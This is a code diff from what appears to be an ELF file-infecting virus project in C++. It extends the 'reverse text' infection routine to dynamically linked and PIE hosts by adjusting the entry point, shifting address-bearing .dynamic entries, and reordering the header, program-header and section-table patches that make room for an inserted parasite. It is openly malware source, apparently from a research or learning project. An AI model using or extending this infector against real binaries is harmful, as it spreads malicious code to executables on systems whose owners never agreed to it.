@@ -103,8 +103,7 @@ void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
       ehdr.e_entry += sizeof(Elf64_Ehdr);
     }
   } else {
-    printf("DYN not implemented\n");
-    CHECK_FAIL();
+    ehdr.e_entry = info.original_code_segment_file_offset - padded_virus_size;
   }
   // section header always comes after the virus.
   ehdr.e_shoff += padded_virus_size;
@@ -116,6 +115,27 @@ void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
   }
 }
 
+bool does_entry_contain_address(Elf64_Xword tag) {
+  // TODO: fix header includes.
+  // https://codebrowser.dev/glibc/glibc/elf/elf.h.html
+  // https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html
+  // gnu elf header has more than kernel header we just want to patch those that
+  // have d_ptr.
+  return (tag >= DT_PLTGOT && tag <= DT_RELA) || tag == DT_INIT ||
+         tag == DT_FINI || tag == DT_REL || tag == DT_DEBUG ||
+         tag == DT_JMPREL || tag == 25 || tag == 26 || tag == 32 ||
+         (tag >= 0x6ffffe00 && tag <= 0x6ffffeff)  // this range uses d_ptr
+         || tag == DT_VERDEF || tag == DT_VERNEED ||
+         tag == DT_VERSYM;  // sun extension
+}
+
+// The dynamic section is generated if the host participates in dynamic linking
+// and it includes various information to support it. For example, the
+// DT_GNU_HASH entry for fast symbol lookup, which points to the starting vaddr
+// of the .gnu.hash section, if moved forwarded to accomadate our virus, must be
+// patched accordingly. This function searches through all entries in .dynamic
+// section and shift those pointers forward if they have a smaller vaddr than
+// the firs byte of CODE (where we insert the virus).
 bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                   const Elf64_Ehdr& ehdr, const Elf64_Shdr& shdr,
                   const ElfReverseTextInfo& info, uint64_t padded_virus_size) {
@@ -128,21 +148,18 @@ bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
 
   for (auto cur_entry = section_entry_start;
        cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
-    printf("current sh entry %x type %d\n", cur_entry, cur_entry->sh_type);
     if (cur_entry->sh_type == SHT_DYNAMIC) {
-      printf("patching .dynamic\n");
       auto* dynamic_section_entry = reinterpret_cast<Elf64_Dyn*>(
           host_mapping.mutable_base() + cur_entry->sh_offset);
-      printf("dynamic entry %x\n", cur_entry->sh_offset);
+      // look at all entries in .dynamic section until the last DT_NULL is
+      // reached. If the entry is an address and is smaller than CODE start, we
+      // have shifted it forward. Adjust values here.
+      // Debug with: readelf -dW
       while (dynamic_section_entry->d_tag != DT_NULL) {
-        printf("dynamic entry\n");
-        if (dynamic_section_entry->d_tag == DT_HASH ||
-            dynamic_section_entry->d_tag == DT_STRTAB ||
-            dynamic_section_entry->d_tag == DT_SYMTAB) {
-          if (dynamic_section_entry->d_un.d_ptr <=
+        if (does_entry_contain_address(dynamic_section_entry->d_tag)) {
+          if (dynamic_section_entry->d_un.d_ptr <
               info.original_code_segment_p_vaddr) {
             dynamic_section_entry->d_un.d_ptr -= padded_virus_size;
-            printf("patched an entry\n");
           }
         }
         dynamic_section_entry++;
@@ -221,25 +238,27 @@ bool reverse_text_infect64(
   auto padded_virus_size = round_up_to_page(parasite_mapping.size());
 
   {
-    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
-        host_mapping.mutable_base() + ehdr.e_phoff);
-    patch_phdr(ehdr, mutable_phdr, padded_virus_size, info);
-  }
-  printf("patched phdr\n");
-  {
-    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
-        host_mapping.mutable_base() + ehdr.e_shoff);
-    patch_sht(ehdr, mutable_shdr, padded_virus_size, info);
-  }
-  printf("patched sht\n");
-
-  {
     const auto& ehdr =
         *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
     const auto& shdr = *reinterpret_cast<const Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
     // Patch .dynamic section if we touched .gnu.hash
     patch_dyamic(host_mapping, ehdr, shdr, info, padded_virus_size);
+    printf("patched dynamic\n");
+  }
+
+  {
+    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
+        host_mapping.mutable_base() + ehdr.e_phoff);
+    patch_phdr(ehdr, mutable_phdr, padded_virus_size, info);
+    printf("patched phdr\n");
+  }
+
+  {
+    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
+        host_mapping.mutable_base() + ehdr.e_shoff);
+    patch_sht(ehdr, mutable_shdr, padded_virus_size, info);
+    printf("patched sht\n");
   }
 
   {
